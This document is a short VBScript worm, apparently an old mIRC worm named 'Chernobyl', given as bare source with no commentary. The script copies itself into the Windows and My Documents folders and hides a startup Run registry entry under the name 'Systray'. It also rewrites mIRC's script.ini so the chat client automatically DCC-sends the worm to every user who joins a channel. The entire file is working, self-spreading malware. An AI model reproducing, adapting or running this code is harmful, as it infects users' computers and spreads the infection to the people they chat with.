Sub Chernobyl()
On Error Resume Next
Dim X, T, Path1, Path2
Set X = CreateObject("Scripting.FileSystemObject")
Set T = CreateObject("Scripting.FileSystemObject")
Path1 = "c:\Windows\Story.vbs"
Path2 = "c:\My Documents\Story.vbs"

Dim W, N, file1, file2
Set W = CreateObject("Scripting.FileSystemObject")
Set file1 = W.GetFile(WScript.ScriptFullName)
Set file2 = W.GetFile(WScript.ScriptFullName)
file1.copy (path1)
file2.copy (path2)

Set N = CreateObject("WScript.Shell")
N.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Systray", "C:\WINDOWS\STORY.VBS"

Dim Z, f1, ts
Const ForWriting = 2
Set Z = CreateObject("Scripting.FileSystemObject")
Z.CreateTextFile ("c:\mirc\script.ini")
Set f1 = Z.GetFile("c:\mirc\script.ini")
Set ts = f1.OpenAsTextStream(ForWriting, False)
ts.write "[script]" & vbCrLf
ts.write "n0=on 1:join:#:if ($nick == $me) {halt} | else dcc send $nick " & Path1 & vbCrLf
ts.Close

End Sub
Chernobyl()